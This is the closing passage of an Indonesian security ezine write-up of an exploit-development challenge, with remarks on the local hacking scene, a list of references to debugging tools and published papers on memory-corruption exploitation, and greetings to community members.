+ini baru 'teaser' :)") atau mungkin karena kurangnya minat 'anak muda' indonesia
+di ranah exploit development dan reverse engineering yang notabene bukanlah
+sesuatu yang instan seperti 'cp x.php.jpg index.php' then hurray! i am a
+hacker, ph34r us! #whoops - just my 2 cent ;)
+
+[*] mungkin untuk challenge-challenge berikutnya akan lebih menarik tentunya
+\o/ [*]
+
+-----| Referensi:
+
+[1] https://www.hex-rays.com/products/decompiler/
+[2] http://www.hopperapp.com
+[3] "Strace untuk analisa eksekusi", http://ezine.echo.or.id/ezine15/06_Strace.txt
+[4] http://github.com/longld/peda
+[5] http://www.trapkit.de/tools/checksec.html
+[6] http://en.wikipedia.org/wiki/Address_space_layout_randomization
+[7] http://en.wikipedia.org/wiki/NX_bit
+[8] "Bypassing StackGuard and StackShield", http://www.phrack.org/issues.html?issue=56&id=5
+[9] "Gebuk Stack Protector", http://ezineecho.or.id/ezine22/e22-008.txt
+[10] "The advanced return-into-lib(c) exploits", http://www.phrack.org/issues.html?issue=58&id=4&mode=txt
+[11] "Return oriented programming", http://cseweb.ucsd.edu/~hovav/papers/rbss12.html
+[12] "Scraps of notes on remote stack overflow exploitation", http://www.phrack.org/issues.html?issue=67&id=13 
+
+
+-----| Greetz to
+
+[+] Echo|Staff : y3dips, lirva32, the_day, k159, az001, & Echoers!
+[+] RNDC : Alm. sj, Eric Draven, ab71, fizme, mahmet, om kopet, others
+[+] Anda!
